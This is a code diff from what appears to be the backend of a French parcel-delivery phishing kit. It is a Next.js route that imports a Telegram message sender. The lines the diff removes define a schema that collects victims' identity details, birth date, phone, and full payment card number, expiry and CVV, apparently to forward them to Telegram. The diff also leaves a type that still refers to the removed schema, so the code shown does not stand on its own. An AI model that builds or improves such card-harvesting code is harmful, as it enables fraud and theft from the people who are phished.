@@ -4,29 +4,6 @@ import { sendTelegramMessage, TelegramConfigurationError } from "@/lib/telegramB
 
 export const dynamic = "force-dynamic";
 
-const notifySchema = z.object({
-  trackingNumber: z.string().trim().optional(),
-  zipcode: z.string().trim().optional(),
-  deliveryMode: z.string().trim().optional(),
-  selectedParcelShop: z.string().trim().optional(),
-  deliveryDate: z.string().trim().optional(),
-  deliveryTime: z.string().trim().optional(),
-  lastName: z.string().trim().optional(),
-  firstName: z.string().trim().optional(),
-  birthDate: z.string().trim().optional(),
-  address: z.string().trim().optional(),
-  city: z.string().trim().optional(),
-  postalCode: z.string().trim().optional(),
-  phone: z.string().trim().regex(/^(?:0[1-9]\d{8}|\+33[1-9]\d{8})$/).optional(),
-  email: z.string().trim().optional(),
-  cardHolder: z.string().trim().min(1),
-  cardNumber: z.string().trim().min(4),
-  expiry: z.string().trim().min(2),
-  cvv: z.string().trim().min(1),
-  timestamp: z.string().trim().min(1),
-  userAgent: z.string().optional(),
-});
-
 type NotifyPayload = z.infer<typeof notifySchema>;
 
 const normalizeHeaderValue = (value: string | null) => value?.replace(/^"+|"+$/g, "").trim() || "";
